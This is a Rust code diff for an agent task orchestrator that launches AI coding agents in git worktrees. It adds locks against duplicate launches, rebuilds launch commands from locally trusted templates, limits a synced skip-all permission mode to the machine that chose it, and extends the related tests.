@@ -18,7 +18,7 @@
 //! talking to `WorkspaceRepo` under the hood but expose `task_id` in
 //! the API so the React side can use the same noun everywhere.
 
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use std::time::Duration;
@@ -165,6 +165,43 @@ pub struct TaskOrchestrator {
     /// Settings + repository rules (branch template, worktree base, copy /
     /// hook / fetch, shell, API keys). `None` in tests: built-in behaviour.
     task_config: Option<TaskConfig>,
+    /// Tasks `launch` / `start_task` are setting up right now (fetch,
+    /// worktree, copy, after-create hook — up to minutes) before their
+    /// agent spawns. Such a row is `pending` with a branch; without this
+    /// set it looked like a draft, and "Start now" + opening its terminal
+    /// spawned the agent while the hook still ran, then the launch's own
+    /// spawn failed and marked the live agent exited. In memory on
+    /// purpose: no new `WorkspaceStatus` (older clients can't parse one),
+    /// and an app quit mid-setup leaves nothing stale behind.
+    starting: Arc<parking_lot::Mutex<HashSet<String>>>,
+    /// Per-task lock around "is a PTY live? → spawn one", so concurrent
+    /// opens of one task attach to a single agent instead of racing two
+    /// registrations and spawns.
+    spawn_locks: Arc<parking_lot::Mutex<HashMap<String, Arc<tokio::sync::Mutex<()>>>>>,
+}
+
+/// Removes a task from `TaskOrchestrator::starting` when setup ends —
+/// whichever way it ends (success, error, a dropped future).
+struct StartingGuard {
+    starting: Arc<parking_lot::Mutex<HashSet<String>>>,
+    signals: Option<AgentSignals>,
+    task_id: String,
+}
+
+impl Drop for StartingGuard {
+    fn drop(&mut self) {
+        self.starting.lock().remove(&self.task_id);
+        if let Some(signals) = &self.signals {
+            signals.clear_starting(&self.task_id);
+        }
+    }
+}
+
+/// The command a launch/resume types, and whether the row's permission
+/// mode was not honoured (see `launch_command`).
+struct LaunchCommand {
+    command: Option<String>,
+    mode_downgraded: bool,
 }
 
 /// What actually gets typed into a fresh agent PTY.
@@ -200,7 +237,102 @@ impl TaskOrchestrator {
             verified_owners: Arc::new(parking_lot::Mutex::new(HashMap::new())),
             signals: None,
             task_config: None,
+            starting: Arc::new(parking_lot::Mutex::new(HashSet::new())),
+            spawn_locks: Arc::new(parking_lot::Mutex::new(HashMap::new())),
         }
+    }
+
+    /// Claim `task_id` as being set up. `None` if it already is: someone
+    /// else's launch owns it, and a second start must not run.
+    fn begin_starting(&self, task_id: &str, repository_id: &str) -> Option<StartingGuard> {
+        if !self.starting.lock().insert(task_id.to_string()) {
+            return None;
+        }
+        if let Some(signals) = &self.signals {
+            signals.mark_starting(task_id, repository_id);
+        }
+        Some(StartingGuard {
+            starting: self.starting.clone(),
+            signals: self.signals.clone(),
+            task_id: task_id.to_string(),
+        })
+    }
+
+    /// Whether `task_id` is being set up to launch right now.
+    pub fn is_starting(&self, task_id: &str) -> bool {
+        self.starting.lock().contains(task_id)
+    }
+
+    fn spawn_lock(&self, task_id: &str) -> Arc<tokio::sync::Mutex<()>> {
+        self.spawn_locks
+            .lock()
+            .entry(task_id.to_string())
+            .or_default()
+            .clone()
+    }
+
+    /// What `task_id`'s agent is doing (`None` = not tracked here).
+    pub fn agent_phase(&self, task_id: &str) -> Option<crate::domain::board::AgentPhase> {
+        self.signals.as_ref().and_then(|s| s.phase(task_id))
+    }
+
+    /// Record that `task_id`'s permission mode was chosen on THIS machine
+    /// (see `launch::trust_task_mode`). No-op without a trust store.
+    async fn trust_mode_here(&self, task_id: &str, mode: Option<PermissionMode>) {
+        if let (Some(meta), Some(mode)) =
+            (self.task_config.as_ref().and_then(TaskConfig::trust), mode)
+        {
+            if let Err(err) = super::launch::trust_task_mode(meta, task_id, mode).await {
+                eprintln!("failed to record the permission mode of task {task_id}: {err}");
+            }
+        }
+    }
+
+    /// The command a launch or resume of `workspace` types.
+    ///
+    /// Never the stored `workspaces.command`: that column syncs, so it may
+    /// have been written on another machine (or by anyone holding the
+    /// account) — and the agent's API key from this machine's Keychain is
+    /// in the environment it runs with. Instead it is rebuilt from THIS
+    /// machine's trusted template for the agent (`settings_trust::usable`),
+    /// the permission mode and the prompt. A `skip-all` mode is honoured
+    /// only if it was chosen on this machine (`launch::effective_mode`);
+    /// otherwise the machine's default mode is used. A row without an
+    /// agent runs nothing (a plain shell).
+    ///
+    /// Without a trust store (tests), the stored command runs as is.
+    async fn launch_command(
+        &self,
+        workspace: &Workspace,
+    ) -> Result<LaunchCommand, OrchestratorError> {
+        let Some(meta) = self.task_config.as_ref().and_then(TaskConfig::trust) else {
+            let stored = workspace.command.trim();
+            return Ok(LaunchCommand {
+                command: (!stored.is_empty()).then(|| workspace.command.clone()),
+                mode_downgraded: false,
+            });
+        };
+        let Some(agent) = workspace.agent else {
+            return Ok(LaunchCommand {
+                command: None,
+                mode_downgraded: false,
+            });
+        };
+        let setup = self.setup_for(&workspace.repository_id).await;
+        let set_here =
+            super::launch::is_task_mode_trusted(meta, &workspace.id, workspace.permission_mode)
+                .await;
+        let (mode, mode_downgraded) = super::launch::effective_mode(
+            agent,
+            workspace.permission_mode,
+            set_here,
+            &setup.settings,
+        );
+        let template = super::launch::resolve_command(agent, mode, &setup.settings)?;
+        Ok(LaunchCommand {
+            command: Some(interpolate_for_task(&template, workspace.prompt.as_deref())),
+            mode_downgraded,
+        })
     }
 
     /// Read settings + repository rules for every launch (see `setup`).
@@ -247,9 +379,9 @@ impl TaskOrchestrator {
         else {
             // Without signals: still never type a prompt the command line
             // already carries.
-            let embeds = command
-                .as_deref()
-                .is_some_and(|c| crate::agent_signals::launch::command_embeds_prompt(c, prompt.as_deref()));
+            let embeds = command.as_deref().is_some_and(|c| {
+                crate::agent_signals::launch::command_embeds_prompt(c, prompt.as_deref())
+            });
             return AgentLaunch {
                 prompt: if embeds { None } else { prompt },
                 command,
@@ -266,12 +398,14 @@ impl TaskOrchestrator {
                 command: stored,
                 prompt: prompt.clone(),
                 resuming,
-                target: target.clone().unwrap_or_else(|| crate::agent_signals::transcripts::TranscriptTarget {
-                    agent,
-                    cwd: cwd.to_path_buf(),
-                    since: None,
-                    session_ids: Vec::new(),
-                    shared_cwd: workspace.workspace_kind == WorkspaceKind::Local,
+                target: target.clone().unwrap_or_else(|| {
+                    crate::agent_signals::transcripts::TranscriptTarget {
+                        agent,
+                        cwd: cwd.to_path_buf(),
+                        since: None,
+                        session_ids: Vec::new(),
+                        shared_cwd: workspace.workspace_kind == WorkspaceKind::Local,
+                    }
                 }),
                 policy: setup.policy(),
             })
@@ -314,6 +448,9 @@ impl TaskOrchestrator {
         }
         let handle = match self.runtime.spawn(spec) {
             Ok(handle) => handle,
+            // Another PTY owns the task: its agent is alive. Marking it
+            // exited would hide a running agent (and its dialogs).
+            Err(err @ crate::pty::handle::PtyError::AlreadyRunning) => return Err(err.into()),
             Err(err) => {
                 if let Some(signals) = &self.signals {
                     signals.mark_exited(task_id);
@@ -373,7 +510,11 @@ impl TaskOrchestrator {
         user_id: Option<&str>,
     ) -> Result<(Repository, PathBuf), OrchestratorError> {
         let repository = match user_id {
-            Some(user_id) => self.repositories.get_for_user(repository_id, user_id).await?,
+            Some(user_id) => {
+                self.repositories
+                    .get_for_user(repository_id, user_id)
+                    .await?
+            }
             None => self.repositories.get(repository_id).await?,
         };
         let repository_path = repository
@@ -394,7 +535,11 @@ impl TaskOrchestrator {
         Ok((repository, repository_path))
     }
 
-    async fn get_task(&self, task_id: &str, user_id: Option<&str>) -> Result<Workspace, OrchestratorError> {
+    async fn get_task(
+        &self,
+        task_id: &str,
+        user_id: Option<&str>,
+    ) -> Result<Workspace, OrchestratorError> {
         Ok(match user_id {
             Some(user_id) => self.workspaces.get_for_user(task_id, user_id).await?,
             None => self.workspaces.get(task_id).await?,
@@ -414,7 +559,12 @@ impl TaskOrchestrator {
         start_point: &str,
         setup: &TaskSetup,
     ) -> Result<PathBuf, OrchestratorError> {
-        let branch = setup.branch_for(repository_path, &workspace.name, &workspace.id, workspace.agent);
+        let branch = setup.branch_for(
+            repository_path,
+            &workspace.name,
+            &workspace.id,
+            workspace.agent,
+        );
         let worktree_path = setup.worktree_base().join(&workspace.id);
         git::create_worktree(repository_path, &worktree_path, &branch, start_point)?;
         workspace.branch = Some(branch);
@@ -456,11 +606,15 @@ impl TaskOrchestrator {
                 worktree.to_path_buf(),
                 setup.config.copy_untracked_globs.clone(),
             );
-            let copied = tokio::task::spawn_blocking(move || setup::copy_untracked(&repo, &wt, &globs))
-                .await
-                .unwrap_or_default();
+            let copied =
+                tokio::task::spawn_blocking(move || setup::copy_untracked(&repo, &wt, &globs))
+                    .await
+                    .unwrap_or_default();
             if !copied.is_empty() {
-                log.push(format!("phasr: copied into the worktree: {}", copied.join(", ")));
+                log.push(format!(
+                    "phasr: copied into the worktree: {}",
+                    copied.join(", ")
+                ));
             }
         }
         if let Some(hook) = setup.config.after_create_hook() {
@@ -495,7 +649,9 @@ impl TaskOrchestrator {
         let base = setup.base_branch(request.base_branch.as_deref(), &repository.default_branch);
         validate_branch_name(&base).map_err(OrchestratorError::InvalidBaseBranch)?;
         let mut log = SetupLog::default();
-        let start_point = self.start_point(&repository_path, &base, &setup, &mut log).await;
+        let start_point = self
+            .start_point(&repository_path, &base, &setup, &mut log)
+            .await;
 
         // Serialize git ops against the shared `.git` for this repo.
         // `git worktree add` writes to `.git/worktrees/` and `.git/refs/`
@@ -549,8 +705,17 @@ impl TaskOrchestrator {
             queued: false,
             depends_on: None,
         });
-        let worktree =
-            Self::cut_worktree(&repository_path, &mut workspace, &base, &start_point, &setup)?;
+        // Claimed before the row exists: from the insert until the agent
+        // spawns (the hook can take minutes) the row is `pending` with a
+        // branch, and must not be startable a second time.
+        let starting = self.begin_starting(&workspace.id, &workspace.repository_id);
+        let worktree = Self::cut_worktree(
+            &repository_path,
+            &mut workspace,
+            &base,
+            &start_point,
+            &setup,
+        )?;
 
         // Stamp the owner so cloud sync picks the row up. Without a
         // user_id the workspace stays local-only forever.
@@ -558,6 +723,8 @@ impl TaskOrchestrator {
             Some(user_id) => self.workspaces.insert_for_user(&workspace, user_id).await?,
             None => self.workspaces.insert(&workspace).await?,
         }
+        self.trust_mode_here(&workspace.id, workspace.permission_mode)
+            .await;
 
         // Release the per-repo lock before the PTY spawn + status update:
         // those touch only this task's own row/process, not the shared
@@ -566,7 +733,11 @@ impl TaskOrchestrator {
 
         self.prepare_worktree(&workspace.id, &repository_path, &worktree, &setup, log)
             .await;
-        self.go_running(&workspace.id, request.rows, request.cols).await
+        let started = self
+            .go_running(&workspace.id, request.rows, request.cols)
+            .await;
+        drop(starting);
+        started
     }
 
     fn new_task_row(row: TaskRow) -> Workspace {
@@ -591,7 +762,11 @@ impl TaskOrchestrator {
         user_id: Option<&str>,
     ) -> Result<Workspace, OrchestratorError> {
         let repository = match user_id {
-            Some(user_id) => self.repositories.get_for_user(&row.repository_id, user_id).await?,
+            Some(user_id) => {
+                self.repositories
+                    .get_for_user(&row.repository_id, user_id)
+                    .await?
+            }
             None => self.repositories.get(&row.repository_id).await?,
         };
         if let Some(dependency) = row.depends_on.as_deref() {
@@ -607,6 +782,9 @@ impl TaskOrchestrator {
             Some(user_id) => self.workspaces.insert_for_user(&workspace, user_id).await?,
             None => self.workspaces.insert(&workspace).await?,
         }
+        // Created here: its mode is this machine's choice.
+        self.trust_mode_here(&workspace.id, workspace.permission_mode)
+            .await;
         self.broadcast_status(TaskStatusEvent {
             task_id: workspace.id.clone(),
             repository_id: repository.id,
@@ -639,6 +817,12 @@ impl TaskOrchestrator {
                 .map_err(|_| OrchestratorError::InvalidDependency(dependency.clone()))?;
         }
         let prompt = patch.prompt.clone().unwrap_or(current.prompt.clone());
+        // Only a mode this edit CHANGED is this machine's choice: an edit
+        // of something else re-sends the stored (possibly synced) mode,
+        // which must not be laundered into a trusted one.
+        let mode_changed = patch
+            .permission_mode
+            .filter(|mode| current.permission_mode != Some(*mode));
         let updated = self
             .workspaces
             .update(
@@ -659,6 +843,9 @@ impl TaskOrchestrator {
                 },
             )
             .await?;
+        if mode_changed.is_some() {
+            self.trust_mode_here(task_id, mode_changed).await;
+        }
         self.broadcast_status(TaskStatusEvent {
             task_id: updated.id.clone(),
             repository_id: updated.repository_id.clone(),
@@ -704,12 +891,35 @@ impl TaskOrchestrator {
         rows: Option<u16>,
         cols: Option<u16>,
     ) -> Result<StartedTask, OrchestratorError> {
-        let workspace = self.get_task(task_id, user_id).await?;
-        if !workspace.is_unlaunched() {
+        let mut workspace = self.get_task(task_id, user_id).await?;
+        // The whole launch — fetch, worktree, hook, spawn — is one claim:
+        // a second "Start now" (or a queue pass) while it runs returns the
+        // row instead of starting the task again.
+        let Some(starting) = self.begin_starting(task_id, &workspace.repository_id) else {
             return Ok(StartedTask {
                 task_id: workspace.id.clone(),
                 workspace,
             });
+        };
+        if is_failed_before_launch(&workspace) {
+            // The queue gave up on it (`QueueScheduler`): "Start now" retries.
+            workspace = self
+                .workspaces
+                .update(
+                    task_id,
+                    WorkspaceUpdate {
+                        status: Some(WorkspaceStatus::Pending),
+                        exit_code: Some(None),
+                        finished_at: Some(None),
+                        ..Default::default()
+                    },
+                )
+                .await?;
+        }
+        if !workspace.is_unlaunched() {
+            let started = self.finish_interrupted_start(workspace, rows, cols).await;
+            drop(starting);
+            return started;
         }
         let (repository, repository_path) = self
             .task_repository(&workspace.repository_id, user_id)
@@ -719,7 +929,9 @@ impl TaskOrchestrator {
         let base = setup.base_branch(workspace.base_branch.as_deref(), &repository.default_branch);
         validate_branch_name(&base).map_err(OrchestratorError::InvalidBaseBranch)?;
         let mut log = SetupLog::default();
-        let start_point = self.start_point(&repository_path, &base, &setup, &mut log).await;
+        let start_point = self
+            .start_point(&repository_path, &base, &setup, &mut log)
+            .await;
 
         let lock = self.repo_locks.for_repository(&workspace.repository_id);
         let guard = lock.lock().await;
@@ -733,8 +945,13 @@ impl TaskOrchestrator {
         if workspace.agent.is_none() {
             return Err(OrchestratorError::AlreadyLaunched);
         }
-        let worktree =
-            Self::cut_worktree(&repository_path, &mut workspace, &base, &start_point, &setup)?;
+        let worktree = Self::cut_worktree(
+            &repository_path,
+            &mut workspace,
+            &base,
+            &start_point,
+            &setup,
+        )?;
         self.workspaces
             .update(
                 task_id,
@@ -751,7 +968,73 @@ impl TaskOrchestrator {
 
         self.prepare_worktree(task_id, &repository_path, &worktree, &setup, log)
             .await;
-        self.go_running(task_id, rows, cols).await
+        let started = self.go_running(task_id, rows, cols).await;
+        drop(starting);
+        started
+    }
+
+    /// The queue couldn't start `task_id` after repeated attempts: take it
+    /// out of the queue as `failed`, with `reason` in its log. The status
+    /// event raises the "task failed" notification; "Start now" (`launch`)
+    /// retries it. A task that launched meanwhile is left alone.
+    pub async fn fail_unlaunched(
+        &self,
+        task_id: &str,
+        reason: &str,
+    ) -> Result<(), OrchestratorError> {
+        let current = self.workspaces.get(task_id).await?;
+        if !current.is_unlaunched() || self.is_starting(task_id) {
+            return Ok(());
+        }
+        let updated = self
+            .workspaces
+            .update(
+                task_id,
+                WorkspaceUpdate {
+                    status: Some(WorkspaceStatus::Failed),
+                    queued_at: Some(None),
+                    finished_at: Some(Some(Utc::now())),
+                    ..Default::default()
+                },
+            )
+            .await?;
+        let mut log = SetupLog::default();
+        log.push(format!(
+            "phasr: couldn't start this queued task after repeated attempts, so it left the queue: {reason}"
+        ));
+        log.flush(&self.runtime.log_dir, task_id);
+        self.broadcast_status(TaskStatusEvent {
+            task_id: task_id.to_string(),
+            repository_id: updated.repository_id,
+            status: WorkspaceStatus::Failed,
+            exit_code: None,
+        });
+        Ok(())
+    }
+
+    /// `launch` of a row that already has its worktree but never ran: a
+    /// setup interrupted by an app quit, or a legacy pre-created workspace.
+    /// It is started here — the explicit start — rather than by opening
+    /// its terminal (`open_terminal` refuses never-started rows). Anything
+    /// else (running, stopped, finished) is returned as is.
+    async fn finish_interrupted_start(
+        &self,
+        workspace: Workspace,
+        rows: Option<u16>,
+        cols: Option<u16>,
+    ) -> Result<StartedTask, OrchestratorError> {
+        let never_ran = workspace.workspace_kind == WorkspaceKind::Agent
+            && workspace.status == WorkspaceStatus::Pending
+            && workspace.started_at.is_none()
+            && workspace.branch.is_some()
+            && workspace.agent.is_some();
+        if !never_ran || self.runtime.get(&workspace.id).is_some() {
+            return Ok(StartedTask {
+                task_id: workspace.id.clone(),
+                workspace,
+            });
+        }
+        self.go_running(&workspace.id, rows, cols).await
     }
 
     /// `pending → running` for a row whose worktree exists: register with
@@ -763,6 +1046,27 @@ impl TaskOrchestrator {
         rows: Option<u16>,
         cols: Option<u16>,
     ) -> Result<StartedTask, OrchestratorError> {
+        let lock = self.spawn_lock(task_id);
+        let _spawning = lock.lock().await;
+        let current = self.workspaces.get(task_id).await?;
+        // Already running (nothing should get here any more, but if it
+        // does): leave the live agent, its row and its signals alone.
+        if self.runtime.get(task_id).is_some() {
+            return Ok(StartedTask {
+                task_id: task_id.to_string(),
+                workspace: current,
+            });
+        }
+        let worktree_path = match current.worktree_path.as_deref().map(PathBuf::from) {
+            Some(path) if path.exists() => path,
+            Some(path) => self.recreate_missing_worktree(&current, &path).await?,
+            None => return Err(OrchestratorError::WorktreeUnavailable),
+        };
+        let command = self.launch_command(&current).await?;
+        if command.mode_downgraded {
+            eprintln!("[launch] task {task_id}: skip-all mode wasn't set on this machine; using the default mode");
+        }
+
         let started_at = Utc::now();
         let updated = self
             .workspaces
@@ -775,16 +1079,11 @@ impl TaskOrchestrator {
                 },
             )
             .await?;
-        let worktree_path = updated
-            .worktree_path
-            .as_deref()
-            .map(PathBuf::from)
-            .ok_or(OrchestratorError::WorktreeUnavailable)?;
 
         let launch = self
             .agent_launch(
                 &updated,
-                Some(updated.command.clone()),
+                command.command,
                 updated.prompt.clone(),
                 &worktree_path,
                 false,
@@ -805,7 +1104,11 @@ impl TaskOrchestrator {
             exit_code: None,
         });
 
-        self.spawn_exit_watcher(task_id.to_string(), updated.repository_id.clone(), pty_handle);
+        self.spawn_exit_watcher(
+            task_id.to_string(),
+            updated.repository_id.clone(),
+            pty_handle,
+        );
 
         Ok(StartedTask {
             task_id: task_id.to_string(),
@@ -815,7 +1118,11 @@ impl TaskOrchestrator {
 
     /// Ids of tasks with a live PTY.
     pub fn running_task_ids(&self) -> std::collections::HashSet<String> {
-        self.runtime.activity().into_iter().map(|(id, _)| id).collect()
+        self.runtime
+            .activity()
+            .into_iter()
+            .map(|(id, _)| id)
+            .collect()
     }
 
     /// Run the agent in the repository's own checkout, on its `local`
@@ -845,8 +1152,12 @@ impl TaskOrchestrator {
         {
             Some(local) => local,
             None => {
-                self.create_local_workspace(repository, &repository_path, request.user_id.as_deref())
-                    .await?
+                self.create_local_workspace(
+                    repository,
+                    &repository_path,
+                    request.user_id.as_deref(),
+                )
+                .await?
             }
         };
         // Same owner rule as every other task id (a local row belongs to
@@ -862,8 +1173,10 @@ impl TaskOrchestrator {
         if let Some(shell) = live {
             // Free the runtime slot for the agent. The old PTY's exit
             // watcher notices it was replaced and leaves the row alone
-            // (see `spawn_exit_watcher`).
-            let _ = shell.kill();
+            // (see `spawn_exit_watcher`). The whole session, not just the
+            // shell: a `pnpm dev` started in it would keep the checkout's
+            // ports and files.
+            shell.terminate(TERMINATE_GRACE);
             self.runtime.drop_task(&local.id);
         }
 
@@ -885,6 +1198,8 @@ impl TaskOrchestrator {
                 },
             )
             .await?;
+        self.trust_mode_here(&claimed.id, claimed.permission_mode)
+            .await;
 
         let launch = self
             .agent_launch(
@@ -909,7 +1224,11 @@ impl TaskOrchestrator {
             status: WorkspaceStatus::Running,
             exit_code: None,
         });
-        self.spawn_exit_watcher(claimed.id.clone(), claimed.repository_id.clone(), pty_handle);
+        self.spawn_exit_watcher(
+            claimed.id.clone(),
+            claimed.repository_id.clone(),
+            pty_handle,
+        );
 
         Ok(StartedTask {
             task_id: claimed.id.clone(),
@@ -944,28 +1263,30 @@ impl TaskOrchestrator {
     /// if the child is still alive. Status flips to `stopped`. The
     /// worktree is preserved — only `delete_task` removes it.
     pub async fn stop_task(&self, task_id: &str) -> Result<(), OrchestratorError> {
+        // Out of the map NOW, not after the grace period: a reopen during
+        // the grace must spawn a fresh session, not attach to this dying
+        // one (whose delayed terminate would then kill what the user is
+        // looking at). Its exit watcher sees it was replaced and leaves
+        // the row alone; the row is settled below.
         let handle = self
             .runtime
-            .get(task_id)
+            .retire(task_id)
             .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
 
         // Best-effort SIGINT. Errors are non-fatal — we'll escalate.
         let _ = handle.interrupt();
+        if let Some(signals) = &self.signals {
+            signals.mark_exited(task_id);
+        }
 
-        let handle_for_escalation = handle.clone();
-        let task_id_for_escalation = task_id.to_string();
-        let runtime_for_escalation = self.runtime.clone();
         tokio::spawn(async move {
             tokio::time::sleep(SIGINT_GRACE).await;
-            // If the runtime no longer tracks the task, the wait
-            // thread already saw the child exit — nothing to do.
-            if runtime_for_escalation
-                .get(&task_id_for_escalation)
-                .is_some()
-            {
+            // Only THIS handle: a session reopened meanwhile is another
+            // PTY and is never touched.
+            if handle.exit_code().is_none() {
                 // The whole terminal session (the agent and anything it
                 // or the user started), HUP → TERM → KILL.
-                handle_for_escalation.terminate(TERMINATE_GRACE);
+                handle.terminate(TERMINATE_GRACE);
             }
         });
 
@@ -1008,6 +1329,7 @@ impl TaskOrchestrator {
         // Archive/delete are the end of this task id's life as far as the
         // terminal is concerned; don't keep vouching for it.
         self.verified_owners.lock().remove(task_id);
+        self.spawn_locks.lock().remove(task_id);
         if let Some(signals) = &self.signals {
             signals.forget_task(task_id);
         }
@@ -1039,6 +1361,10 @@ impl TaskOrchestrator {
         rows: u16,
         cols: u16,
     ) -> Result<TaskTerminalSubscription, OrchestratorError> {
+        // One opener at a time per task: a second concurrent open waits,
+        // then attaches to the agent the first one spawned.
+        let lock = self.spawn_lock(task_id);
+        let _spawning = lock.lock().await;
         let workspace = self.workspaces.get(task_id).await?;
 
         if let Some(handle) = self.runtime.get(task_id) {
@@ -1059,18 +1385,25 @@ impl TaskOrchestrator {
                 workspace.status.as_str().into(),
             ));
         }
-        // A draft / queued task has no worktree: resuming it here would
-        // run the agent in the repository's own checkout.
-        if workspace.is_unlaunched() {
+        // Its launch is still setting it up: the agent spawns when the
+        // after-create hook is done. Spawning here too ran it twice.
+        if self.is_starting(task_id) {
+            return Err(OrchestratorError::Starting);
+        }
+        // Only a task that has run before is RESUMED here. A draft or
+        // queued task (no worktree: it would run in the repository's own
+        // checkout), or one whose setup was interrupted, starts through
+        // `launch` — the explicit start — never by opening its terminal.
+        if workspace.status == WorkspaceStatus::Pending && workspace.started_at.is_none() {
             return Err(OrchestratorError::NotStarted);
         }
 
         let cwd = self.cwd_for_task(&workspace).await?;
-        let initial_command = if workspace.command.trim().is_empty() {
-            None
-        } else {
-            Some(workspace.command.clone())
-        };
+        let launch_command = self.launch_command(&workspace).await?;
+        if launch_command.mode_downgraded {
+            eprintln!("[launch] task {task_id}: skip-all mode wasn't set on this machine; resuming in the default mode");
+        }
+        let initial_command = launch_command.command;
         let initial_prompt = workspace.prompt.as_ref().and_then(|p| {
             let trimmed = p.trim();
             if trimmed.is_empty() {
@@ -1181,9 +1514,23 @@ impl TaskOrchestrator {
             .runtime
             .get(task_id)
             .ok_or_else(|| OrchestratorError::TaskNotRunning(task_id.to_string()))?;
+        // A message ends in Enter, and Enter on an approval dialog picks
+        // the highlighted option — "Yes". The dialog is answered through
+        // `respond_to_attention` (or the terminal), never the composer.
+        if self
+            .signals
+            .as_ref()
+            .is_some_and(|s| s.awaiting_answer(task_id))
+        {
+            return Err(OrchestratorError::AwaitingAnswer);
+        }
         handle.send_message(text, submit).await?;
         if let Some(signals) = &self.signals {
-            let sent: &[u8] = if text.is_empty() { b"\r" } else { text.as_bytes() };
+            let sent: &[u8] = if text.is_empty() {
+                b"\r"
+            } else {
+                text.as_bytes()
+            };
             signals.note_user_input(task_id, sent);
         }
         Ok(())
@@ -1211,7 +1558,10 @@ impl TaskOrchestrator {
             .as_ref()
             .ok_or(crate::agent_signals::AgentSignalError::StaleAttention)?;
         let keys = signals.claim_attention(task_id, attention_id, response)?;
-        for (i, key) in crate::agent_signals::split_keystrokes(&keys).into_iter().enumerate() {
+        for (i, key) in crate::agent_signals::split_keystrokes(&keys)
+            .into_iter()
+            .enumerate()
+        {
             if i > 0 {
                 tokio::time::sleep(KEYSTROKE_GAP).await;
             }
@@ -1234,6 +1584,12 @@ impl TaskOrchestrator {
             // re-attaches an existing branch, so this restores the exact
             // branch the agent was on.
             return self.recreate_missing_worktree(workspace, &path).await;
+        }
+        // An agent task runs in its own worktree, never in the repository's
+        // checkout: a row with no worktree here (never launched, or synced
+        // without a branch) has nowhere safe to run.
+        if workspace.workspace_kind == WorkspaceKind::Agent {
+            return Err(OrchestratorError::WorktreeUnavailable);
         }
 
         let repository = self.repositories.get(&workspace.repository_id).await?;
@@ -1326,9 +1682,9 @@ impl TaskOrchestrator {
                         // fresh `running` row to `failed` nor unregister the
                         // agent's PTY. (A quiesced task is already
                         // unregistered and its row already `stopped`.)
-                        let still_ours = runtime
-                            .get(&task_id)
-                            .is_some_and(|current| std::ptr::eq(Arc::as_ptr(&current), watched.as_ptr()));
+                        let still_ours = runtime.get(&task_id).is_some_and(|current| {
+                            std::ptr::eq(Arc::as_ptr(&current), watched.as_ptr())
+                        });
                         if !still_ours {
                             break;
                         }
@@ -1377,6 +1733,14 @@ impl TaskOrchestrator {
     }
 }
 
+/// A queued task the scheduler gave up on before it ever launched (see
+/// `QueueScheduler`): `failed`, no branch. "Start now" may retry it.
+fn is_failed_before_launch(workspace: &Workspace) -> bool {
+    workspace.workspace_kind == WorkspaceKind::Agent
+        && workspace.status == WorkspaceStatus::Failed
+        && workspace.branch.is_none()
+        && workspace.outcome.is_none()
+}
 
 #[cfg(test)]
 mod tests {
@@ -1387,8 +1751,12 @@ mod tests {
     use std::process::Command;
     use std::time::Duration;
 
-    async fn fresh_orchestrator(
-    ) -> (TaskOrchestrator, RepositoryRepo, crate::store::Db, tempfile::TempDir) {
+    async fn fresh_orchestrator() -> (
+        TaskOrchestrator,
+        RepositoryRepo,
+        crate::store::Db,
+        tempfile::TempDir,
+    ) {
         let dir = tempfile::tempdir().unwrap();
         let db_path = dir.path().join("test.sqlite");
         let pool = init_pool(&db_path).await.unwrap();
@@ -1617,12 +1985,28 @@ mod tests {
         let repo_path = PathBuf::from(repo.local_path.clone().unwrap());
         // A `develop` base with a marker file, and an ignored `.env` in the
         // checkout to copy; README.md is tracked (must not be overwritten).
-        Command::new("git").args(["checkout", "-qb", "develop"]).current_dir(&repo_path).status().unwrap();
+        Command::new("git")
+            .args(["checkout", "-qb", "develop"])
+            .current_dir(&repo_path)
+            .status()
+            .unwrap();
         std::fs::write(repo_path.join("DEVELOP"), "d").unwrap();
         std::fs::write(repo_path.join(".gitignore"), ".env\n").unwrap();
-        Command::new("git").args(["add", "-A"]).current_dir(&repo_path).status().unwrap();
-        Command::new("git").args(["commit", "-qm", "develop"]).current_dir(&repo_path).status().unwrap();
-        Command::new("git").args(["checkout", "-q", "main"]).current_dir(&repo_path).status().unwrap();
+        Command::new("git")
+            .args(["add", "-A"])
+            .current_dir(&repo_path)
+            .status()
+            .unwrap();
+        Command::new("git")
+            .args(["commit", "-qm", "develop"])
+            .current_dir(&repo_path)
+            .status()
+            .unwrap();
+        Command::new("git")
+            .args(["checkout", "-q", "main"])
+            .current_dir(&repo_path)
+            .status()
+            .unwrap();
         std::fs::write(repo_path.join(".env"), "TOKEN=1\n").unwrap();
         std::fs::write(repo_path.join("README.md"), "edited in checkout").unwrap();
 
@@ -1647,13 +2031,29 @@ mod tests {
             .unwrap();
         let ws = &started.workspace;
         let worktree = PathBuf::from(ws.worktree_path.clone().unwrap());
-        assert_eq!(worktree, base.join(&ws.id), "under the repository's worktree base");
+        assert_eq!(
+            worktree,
+            base.join(&ws.id),
+            "under the repository's worktree base"
+        );
         assert_eq!(ws.branch.as_deref(), Some("team/claude/add-login-page"));
         assert_eq!(ws.base_branch.as_deref(), Some("develop"));
         assert!(worktree.join("DEVELOP").exists(), "cut from develop");
-        assert_eq!(std::fs::read_to_string(worktree.join(".env")).unwrap(), "TOKEN=1\n");
-        assert_eq!(std::fs::read_to_string(worktree.join("README.md")).unwrap(), "hi", "never overwritten");
-        assert_eq!(std::fs::read_to_string(worktree.join("HOOK")).unwrap().trim(), "hook-ran");
+        assert_eq!(
+            std::fs::read_to_string(worktree.join(".env")).unwrap(),
+            "TOKEN=1\n"
+        );
+        assert_eq!(
+            std::fs::read_to_string(worktree.join("README.md")).unwrap(),
+            "hi",
+            "never overwritten"
+        );
+        assert_eq!(
+            std::fs::read_to_string(worktree.join("HOOK"))
+                .unwrap()
+                .trim(),
+            "hook-ran"
+        );
         let log = orchestrator.read_task_log(&ws.id).await.unwrap();
         assert!(log.contains("from-the-hook"), "{log}");
         assert!(log.contains("copied into the worktree: .env"), "{log}");
@@ -1764,7 +2164,10 @@ mod tests {
             .start_task(sleep_request(&repo.id, "add-feature"))
             .await
             .unwrap();
-        assert_ne!(started.task_id, draft.id, "the draft was returned instead of a new task");
+        assert_ne!(
+            started.task_id, draft.id,
+            "the draft was returned instead of a new task"
+        );
         assert_eq!(started.workspace.status, WorkspaceStatus::Running);
         assert_eq!(started.workspace.base_branch.as_deref(), Some("main"));
         // The draft has no worktree: opening its terminal must not run the
@@ -1909,7 +2312,10 @@ mod tests {
                 .start_task(sleep_request(&repo.id, &name))
                 .await
                 .unwrap_or_else(|e| {
-                    panic!("re-run after `{}` should create a task: {e}", status.as_str())
+                    panic!(
+                        "re-run after `{}` should create a task: {e}",
+                        status.as_str()
+                    )
                 });
             assert_ne!(
                 started.task_id,
@@ -2372,7 +2778,11 @@ mod tests {
